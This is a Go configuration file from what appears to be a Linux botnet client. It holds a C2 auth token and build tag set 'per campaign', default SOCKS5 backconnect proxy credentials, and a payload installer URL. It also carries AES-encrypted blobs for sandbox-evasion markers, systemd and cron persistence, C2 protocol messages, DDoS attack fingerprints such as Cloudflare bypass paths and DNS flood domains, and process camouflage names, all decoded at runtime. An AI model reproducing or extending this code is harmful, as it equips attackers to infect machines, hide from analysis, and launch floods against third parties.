package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "7ac7836f" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "bYcY7ti3gnS5E!#h" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "V3_2" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("8f5f1cf466ae3d27538856e6eedccabfd8e8b5a28cd8c7c34d91c5e4676c7c84b549c205472199b55b8624fa08400c8e7e4cfcc9bc7b1af0c433828539bf4abe095b32c7898b8f6b") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("99264fd8387d3d6adb7a2c8b9932b51ca54780e1bf9e76334c16054537d32efc8d408186d163cc5731d3b133b38535a14e2a1d2b20658364d09d071bc1e9660d32db65d51427801bef5ab8c330bdbc8cc55898528ae5ccef2569c9344aefcd6d15476d8b055aa2d9448f63503e54e26ce2a5c12cb6")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("70e81d7aa001657c3445f7eb38c8e0a32c3307946a08f9b9d31f25ca8a36d9b4b1e7253543b6a4a73c5011a401921bb8582ea447940bd6410704c83b8987f805c9d459b1543a6bef41fd")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("807b0db74c49b6555ad116e6b27960d4a6f7579a3dea935ce7c704ce44dd42fb")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("a609b998ee323006f0e8b1e2ae87818fa9a49e613bb557a12d9b1fd019")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("1a0a3487c3db12a604936bb38b5ccb387b34ae01287b823ac440c4cda14a35015c3a626417")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("1353901a3490a7837498afdd12619823770d8b390318aeb8328e652ff14191")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("2cc71239c57f8ed0c937b8a83135b661299ceb13f299241cead403f312")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("a6876502557c947988d570fda6c1d9fbe011afe26830551d99673055e80173665d3971141554146dc2a8b86cfda45ff11c284e57c9b8a7")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("97ca56451728f38222bfa22ccd8282fbbb2a9fedaf20da969ccb30218bac805c7f4af2")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("e71311720379e96108cbaf532ed698bf199ec9cb3ef01896af9fb0b5d065d43f182a109602f6b778d632e5954b1030a930f1dc163fabb7394ff61565938f0577f63065841289b6fa4fafe08b7d237f5d9e4cd548811c78b973352b7373333468b927b51120d7dde895f4baf54028b6495544dd51a645ae49cde34b21f1d5a30aa163af1d891c1694e859cf4890f0e2295b260ccf4fdc3d306cf386e596001b8bdbfc649194b5872cc266ab494c62aa8ec0678afdf0cbf8456d613332cee3094228e2ac487dafbdb350483d62507fb2")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("a1ad8d9a9465f83151f97064ef1f16b7fd2d329c0168b6c3be41a1ccc676922cd9208de5b865557673f21ebdc67f59ff2ba14571b131fe4563e5819f5e8627fb9b47f00aa49b62136896988360f99bce21bdb1511c6d3096fd5632a6bf235d718a1d201411b598bfd83c75a86785d64e77f8bc86d6c04362888726d67a610f8579bd652b05f9e363540cc065e8c6516ac17291bb10d6b40e786acc8eaa995d8449d5bf6231cd25563b0c2b0f2c54c9ef1f5c2dfa5eb72a84a6535c0fb7b531f901ef342b88a0")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("6557cea1153976745f34a31dae80ce443e6e750252b0fef0aa")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("36cac6bf9fe6771af440f3f55cd28296493380f743cefb502432868327")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("7e1c47943ca664ac3382732a2f8bac187bc240faba296585d2793abf686592edefd07b6c0e165f")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("8706ec9444c9995bf7e55898b35c54922006a95541f76aa1cd6a7d092b4635a58afaea5385c1ac3b7513a5")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("3f55283687d1a4f7fe1620745885fd7f1167a799560af016038f2c443be445")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("d9c5655dea6e697cb20180ad3350aa1628784deb924069762599a04a")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("922ffbdec82e35b18c45baf4cdd7c82fa16af6c49aa94da7c24c0967d58c93c7ba333f13d77c3055db836f2c25d3c1df")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("a39998a858d843706f567e5cae638c3fcb2a0a03")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("ec8874505504ca89dda5303e0c68c03612c1fe78a3")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("ffecd818211647655e860fcd6155e63881354878d0f881bf6b98c580194e32")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("57d38591191a384d481a375b1ecf8f25517f998adf2044a6a80f")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("7c14869803d62c3cf93e9de746ab1f110f8417b1008a679a1df362")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("383711e0b8f2ab27330591967f6bb8e4c51fb53e0153970b5f5413")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("c6a090112dc7c365e371bba832c85f4cff602313721cbc7557ba8d4bb9e979")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("9f7a515bb55e150433dde22c3cf48c084a0f9c8d19b1008b37fad5296bb8d64fccb39d9f47dfa39767c215a4bede99d7bf588d71e5")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("c4101d712de9d8e8257dc1687d7b7e99a69ae85a76c9dc93dd")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("a2e1299805a0b73334837d20e8e14ce2e86caf4c8d13a0d3c36b696af5c5e8120de4")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("86bc8f863bbd31e24676ad537c93474862dc377d6e5bbf425c76d20660132b683213baa8c21909b28dad16842b41")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("c327d83aba1cb448f30c5508311d553090e32f43e15083535ae6aa46e379395a5fe0f3897352f273f4d3a669")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("3e1d8c8ec1a1553a3c90e24466471553caa47080edf29833120100362ded61e4f7284fa72993eecf8d393a912fd8d3a408b7bed77bbfb3d944a6")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("4c3a6883b2578b541ed075d7de865b545897601d49663543631479d32566bcc4")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("924442691645ba2993af632958ae81673bddc747e6ff42132e198a9b4a391794ca64372d413d91b33152ce4fb3b7aff8")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("d73aae561edbb34731b67135106806b5fb0b0daba4780290a85e1d02f118f85e3f16eed89e")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("b76b33611036123de6ad17baee6945c4fcd948b6c705ecbd88b2a24a3c1e27f577ed6ce6cd70af92af5f9c3777a805")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("acb0dd297c299229007655527f88fb9238130d2fb36a8d4cf6372d459fb32cdd8ac7eaa364c5327778475e688cd29c75bdefa378e6449ccda89d39fe33ba683321c0d76bb78fe3360a8dd3caa31400ea1360557b8c1b8a75c74cba2222f6305ba7d1308de6461a51743242189cd92ba018")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("3c92d8470904a3ae803cc107fc58dd8948eb59e5573cd8a1ef6468e6e80c8b98e67c922615370b911d623b53c1eb07d66b6696c86be02bebd953a96a17e69b160a598d55c2292b22b6381f6e42d05a4735")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("488475310f0f592c4acdb75102c8df5c224a9e044c2566f49f2e9cc45ad1b3739c1a72f1c88595f0f61200e7e3ba9fde24f02a0e2e46e41aebdbd6525c44f365820370299c08c497ceab15c0b384")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("afa607240c3e2838e9b51ca5c66a677ee59dab17c9c93cc66cae6690fefc5055fa39f676718e6e6024599d5510d0a5272a7140c382da96630b0297aecd7abc0b372eda198500d8f35313d95213")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("981fb6ed7f9650c754ba2220732fb48101960245294b6608ce1c9e601eaca444361f2755a94638276b3afc93111fb8d5d5189dc696ed8004c0490b4fb4e51f")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("dd7c3c183e9ae77dc499dd2ca09045acbde5a7182fd8d2dfe7f332e2f217c8996a9ade58")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("9124c941a254171ef2cdb487f92ab4764320b714cf9cf267408c1fef8cea658c8bcd454411a2b5121a43cd1dac20cffc887962e9af44b8b72766061d2a056dacf21557ea0a49071dfc57124097e721e7e64b547e44cf498c3f69f4d3d320c3d6e0805537839b8c87f59604addeb6c58cc43867c3c44cf88eda3380d4575c51474524fb023e40be06bef551ae27852017154d3d71623b0287bb6af1ed035a5e373bc5023fa9a19df54c6064c5954356a12ead3beb4445617a6d24ef1c5d8878ff3ef4a6c4d6afe66db46fabc92a3337cb519d36251003c7dc1fd37c011b")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("2baaa295773661336e36a9fdd234df7ae4481c74061a776a099b70daa57de6033a52132b7c5344d2b9ebd533875845dd8b0f1d5504a302c78abf95912585bbce5bff119c0d75d6ee6180c65dfd556a8c6893f85d4a558758570a4e")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("2b783f347531df945a042261ebc4a1584d52fd5fb4e97bf06193f424bed6d8ca45a0e0ed436c1a923b8ceb8106b6496d622e2a96e64ab7f6a5f0c1")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("8cd52d6381fcaed6d64c04f01f857a504fc5fd31694836a841ee23d94e2d3400a4dae45680631d77e88e919c94f2b9e33ba39defb3702920278978024542e5b29f91642590d8026b0a")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("466a09dd9480ea7e7c0e23d35f7ad18c96592d0bc63980")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("f1f52516152b2ee1d92c9865c50ead9e4bf0574005689960d15facc85ed44f5542d6")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("b28cab9b5829dc26da4849eab8c7084ec62fae422d1b1b462451bbacd4cb2bb761e54706ee182c23b2e44de67e8abcaabff3ecbc420b941f7e412f06277046dda7b7699ca9bd120ece7ad78789ab129d26a713a19014fcfe03350d34f6ff62")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("713689ce1ea1ba340eb525fcd54f1fe43bb8")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("ab7e76de429e4d0ce280ef8d077383f493692f5d3c18dad37b1fb29b74adf42fd0a71765347f2483cca2734dad1da0d714b2ea9872")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("05206b30c47adee7f170918c5f69b90a6eb6")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("472dcd6a88e86d63666f68ef87083b43e69a")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("b72e672bc35555cbef5214d2262006ac0c3a0b54439b")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("3a7ac7bde56362edf8e78a03a2a8194dbd65cd94ae33ddc8")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("7915020c31b1a5226facf57b6a65a32e2535f09629")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("703b3e0d18768612e41c0f18bbee96847c6d")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("c3b7dcdf56225abe11963ca8eda167df621284667b23eca218")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("ca1b549a652fb1d5f375d4535c92be287839f6b324456ed028")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("d8dd87dd8634c371426db29fa1d95c2efe18d8a4e3caf2")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("73298b3dad9112d167c37945d40331b63882a802")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
